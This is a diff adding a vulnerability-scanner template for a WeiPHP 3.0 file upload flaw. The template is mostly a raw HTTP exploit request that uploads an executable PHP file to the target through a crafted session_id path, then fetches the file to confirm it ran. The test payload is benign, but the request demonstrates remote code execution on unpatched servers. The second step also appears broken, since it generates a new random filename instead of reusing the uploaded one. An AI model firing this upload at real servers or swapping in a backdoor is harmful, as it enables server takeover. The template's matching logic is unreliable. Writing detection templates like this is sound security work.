@@ -1,0 +1,45 @@
+id: weiphp-session-id-file-upload
+info:
+  name: WeiPHP 3.0 Session ID File Upload Vulnerability
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    WeiPHP 3.0 has a file upload vulnerability. Attackers can upload files of dangerous types without restrictions, write backdoors, obtain server permissions, and then control the entire web server.
+  reference:
+    - https://www.uedbox.com/post/13255/
+http:
+  - raw:
+      - |
+        POST /index.php?s=/Home/File/upload/session_id/scevs8hub3m5ogla05a421hb42.html HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary=------------------------e37a54d7d5380c9f
+
+        --------------------------e37a54d7d5380c9f
+        Content-Disposition: form-data; name="download"; filename="{{rand_int(100000, 999999)}}.php"
+        Content-Type: application/octet-stream
+
+        <?php
+        echo(md5(88));
+        @unlink(__FILE__);
+        ?>
+        --------------------------e37a54d7d5380c9f--
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: regex
+        regex:
+          - "/Uploads.*?\\.php"
+  - raw:
+      - |
+        GET /Uploads/{{rand_int(100000, 999999)}}.php HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "2a38a4a9316c49e5a833517c45d31070"
